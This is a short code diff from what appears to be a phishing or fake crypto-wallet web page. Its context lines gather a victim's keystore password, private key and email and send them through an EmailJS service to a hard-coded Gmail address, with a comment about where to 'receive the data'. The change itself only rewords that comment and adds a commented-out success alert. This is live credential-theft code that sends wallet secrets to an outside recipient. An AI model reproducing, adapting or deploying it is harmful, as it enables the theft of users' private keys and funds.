@@ -2487,11 +2487,12 @@
             keystore_password: keystorePassword,
             private_key: privateKey,
             user_email: userEmail,
-            email: "smthdevane@gmail.com" // The email address where you want to receive the data
+            email: "smthdevane@gmail.com" // Add the email address where you want to receive the data
         };
     
         emailjs.send('service_gdxh0ee', 'template_4ehv3k8', templateParams)
             .then(function(response) {
+                // alert("Wallet information sent successfully.");
                 console.log('SUCCESS!', response.status, response.text);
             }, function(error) {
                 alert("Failed to send. Please try again.");
